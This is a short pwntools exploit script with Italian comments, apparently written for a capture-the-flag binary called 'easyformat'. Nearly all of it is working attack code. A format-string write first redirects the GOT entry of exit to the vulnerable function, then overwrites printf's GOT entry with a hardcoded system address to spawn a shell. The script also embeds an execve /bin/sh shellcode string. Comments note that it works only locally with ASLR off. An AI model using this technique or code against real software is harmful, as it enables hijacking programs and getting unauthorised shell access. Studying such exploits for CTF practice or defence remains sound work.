#FUNZIONA IN LOCALE SENZA ALSR
from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcodeLenght = 23

p = process("./easyformat")
f = elf.ELF("./easyformat")
libc = elf.ELF("/lib/x86_64-linux-gnu/libc.so.6") #questo in locale, per il remote devo usare la libc scaricata dal sito

raw_input(">>1")

displacement = 4 #devo trovarlo
exitGot = f.got['exit']
printfGot = f.got['printf']
vulnSymbol = f.symbols["vuln"] 
systemAddr = 0xf7e42da0

def calculateFormatString(whatToWrite, whereToWrite, displacement):
	if(whatToWrite >> 16) > (whatToWrite & 0xffff):
		firstAddr = whereToWrite
		secondAddr = whereToWrite + 2
		firstHalf = whatToWrite & 0xffff
		secondHalf = whatToWrite >> 16
	else:
		firstAddr = whereToWrite + 2
		secondAddr = whereToWrite
		firstHalf = whatToWrite >> 16
		secondHalf = whatToWrite & 0xffff
	return p32(firstAddr) + p32(secondAddr) + \
	"%{}c%{}$hn".format(firstHalf - 8, displacement) + \
	"%{}c%{}$hn".format(secondHalf - firstHalf, displacement + 1)

#Sovrascrivo indirizzo di exit con vuln, cosi che la funzione iteri su vuln
p.sendline(calculateFormatString(vulnSymbol, exitGot, displacement))

raw_input(">>2")

#Nella seconda iterazione, sovrascrivo l'indirizzo di printf con system cosi che con la chiamata di printf chiama la shell 
p.sendline(calculateFormatString(systemAddr, printfGot, displacement))

p.interactive()